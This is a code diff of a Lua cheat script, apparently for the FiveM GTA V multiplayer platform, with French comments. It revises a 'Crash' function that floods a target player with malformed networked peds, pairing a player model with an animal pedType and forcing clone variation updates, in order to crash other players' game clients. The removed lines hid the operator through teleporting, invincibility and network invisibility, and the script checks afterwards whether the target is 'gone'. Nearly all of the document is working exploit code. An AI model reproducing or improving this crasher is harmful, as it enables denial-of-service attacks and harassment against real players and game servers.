-    local targetZ = at.z + DROP.height + (math.random() - 0.5) * 2.0 * DROP.heightJitter
-    dropMove(myPed, origin, { x = at.x, y = at.y, z = targetZ },
-             DROP.liftSteps, DROP.liftGap)
-    pcall(FreezeEntityPosition, myPed, true)
-    pcall(SetEntityInvincible, myPed, true)
-
-    Citizen.Wait(100)
-    local check = GetEntityCoords(myPed)
-    local vdx, vdy, vdz = check.x - at.x, check.y - at.y, check.z - at.z
-    local lift = math.sqrt(vdx * vdx + vdy * vdy + vdz * vdz)
-    if lift < DROP.height * 0.5 then
-        -- Les paliers n'ont pas pris : la native de deplacement est absente
-        -- ou bloquee. Une seule reprise franche avant d'abandonner, sinon on
-        -- ne saura jamais si c'est la montee ou le vecteur qui est en cause.
-        local hard = dropNative("SetEntityCoords") or dropCoordsFn()
-        if hard then
-            pcall(hard, myPed, at.x, at.y, targetZ, false, false, false, false)
-            pcall(FreezeEntityPosition, myPed, true)
-            Citizen.Wait(200)
-            check = GetEntityCoords(myPed)
-            vdx, vdy, vdz = check.x - at.x, check.y - at.y, check.z - at.z
-            lift = math.sqrt(vdx * vdx + vdy * vdy + vdz * vdz)
-            O.log("drop: hard snap, lift %.0f m", lift)
-        end
-    end
-    if lift < DROP.height * 0.5 then
-        dropRestore(myPed, origin)
-        DROP.running = false
-        O.log("drop: abort, envelope refused, only %.0f m", lift)
-        dropStatus("abort envelope")
-        pcall(Notify, "Drop: envelope refused", CLR.red)
-        return
-    end
-
     local okBody, err = pcall(function()
-        for wave = 1, DROP.waves do
-            if not DROP.running then break end
-            local made, gone, notNet = dropWave(targetPed, model, hp0 - 15, myPed, wave, createdHandles)
-            total = total + made
-            removed = removed + gone
-            O.log("drop: wave %d/%d, %d created, %d removed, %d unnetworked",
-                  wave, DROP.waves, made, gone, notNet)
-            dropStatus(("w%d %d/%d u%d"):format(wave, made, gone, notNet))
-            if wave < DROP.waves then Citizen.Wait(DROP.betweenWaves) end
-        end
+        total, notNet = dropFlood(targetPed, model, myPed, handles)
     end)
     if not okBody then
         O.log("drop: body error %s", tostring(err))
     end
+    O.log("drop: flood %d created, %d unnetworked", total, notNet)
+    dropStatus(("flood %d u%d"):format(total, notNet))
 
-    -- Rien n'a pu etre cree : la creation est coupee au niveau factory. On
-    -- redescend (aucune entite en vol, donc aucun risque) et on passe au
-    -- mode sol dans le meme run, sans demander un second appui.
     if total == 0 and DROP.rung >= 4 and DROP.running then
         O.log("drop: creation blocked, ground mode")
-        pcall(Notify, "Drop: ground mode", CLR.blue)
-        dropRestore(myPed, origin)
-        local made, touched = dropGround(targetPed, model, myPed, hp0 - 15)
-        O.log("drop: ground mode, %d morphed, %d restored", made, touched)
+        local made, restored = dropGround(targetPed, model, myPed, DROP.healthFloor)
+        O.log("drop: ground mode, %d morphed, %d restored", made, restored)
         dropStatus(("ground %d"):format(made))
         total = made
         groundRan = true
     end
 
-    -- Sortie de la bulle avant la purge. On monte seulement si des entites
-    -- ont vraiment ete creees : sans entite en vol, il n'y a rien a fuir.
-    -- C'est ici qu'on devient invisible reseau : personne ne voit l'aller
-    -- 300 -> 650 m ni le retour.
     if not groundRan and total > 0 and DROP.running then
-        local invis = dropInvisFn()
-        if invis then pcall(invis, myPed, true) end
-        local here = GetEntityCoords(myPed)
-        dropMove(myPed, here, { x = at.x, y = at.y,
-                                z = at.z + DROP.escapeHeight },
-                 DROP.liftSteps, DROP.liftGap)
-        pcall(FreezeEntityPosition, myPed, true)
+        -- Laisse le dernier batch arriver avant le second passage de variation.
+        Citizen.Wait(DROP.settle)
+        local n = dropRepass(handles)
+        O.log("drop: repass %d peds", n)
+        dropStatus(("repass %d"):format(n))
+
+        -- Maintien : le recepteur doit traiter les updates avant le delete.
+        local deadline = GetGameTimer() + DROP.hold
+        while DROP.running and GetGameTimer() < deadline do
+            if not DoesEntityExist(targetPed) then break end
+            Citizen.Wait(100)
+        end
     end
 
-    local settleStart = GetGameTimer()
-    local resurrections = 0
-    while DROP.running and not groundRan and #createdHandles > 0 do
-        local alive = 0
-        for i = 1, #createdHandles do
-            local ped = createdHandles[i]
-            if ped and DoesEntityExist(ped) then
-                alive = alive + 1
-                pcall(SetEntityAsMissionEntity, ped, true, true)
-                pcall(DeleteEntity, ped)
-                resurrections = resurrections + 1
-            end
-        end
-        local elapsed = GetGameTimer() - settleStart
-        if elapsed >= DROP.settle and alive == 0 then break end
-        if elapsed >= DROP.settleMax then
-            O.log("drop: settle timeout, %d alive", alive)
-            break
-        end
-        Citizen.Wait(500)
-    end
-    O.log("drop: settle %d ms, %d resurrections",
-          GetGameTimer() - settleStart, resurrections)
-
-    dropRestore(myPed, origin)
-    if model ~= 0 then pcall(SetModelAsNoLongerNeeded, model) end
+    removed = dropClear(handles)
     DROP.lastRun = GetGameTimer()
     O.log("drop: created %d, removed %d", total, removed)
     dropStatus(("done %d/%d"):format(total, removed))
 
-    Citizen.Wait(DROP.restoreWait)
     local alive = DoesEntityExist(targetPed)
     O.log("drop: target %s", alive and "still there" or "gone")
     pcall(Notify, alive and "Drop: target still there" or "Drop: target gone",
@@ -34241,9 +33974,8 @@ function DROP.start()
         local ok, err = pcall(dropRun)
         if not ok then
             O.log("drop: run error %s", tostring(err))
+            dropStatus("error")
         end
-        -- Filet : quoi qu'il arrive dans le thread, on ne reste jamais bloque
-        -- en `running`, sinon la ligne est morte pour la session.
         DROP.running = false
     end)
     return true
@@ -34324,12 +34056,11 @@ local function installCrasher()
             end,
         },
         {
-            -- Ligne crash : enveloppe a 600 m (hors portee OneSync), montee et
-            -- descente par paliers, operateur gele / invincible / invisible
-            -- reseau pendant toute l'operation, aucune animation de lancer.
-            -- Deux vagues de 50 peds en pedType 4 avec un modele joueur, via
-            -- une echelle de creation qui survit a un blocage de CreatePed.
-            -- Press again to stop.
+            -- Ligne crash : la recette du build du 2026-10-28, celle qui
+            -- cassait. pedType 28 (animal) + modele joueur, variation
+            -- aleatoire sur tous les slots, clone force sur toutes les
+            -- machines, puis un second passage de variation (update de clone)
+            -- avant suppression. Aucun teleport. Press again to stop.
             name = "Crash",
             type = "action",
             onClick = function()
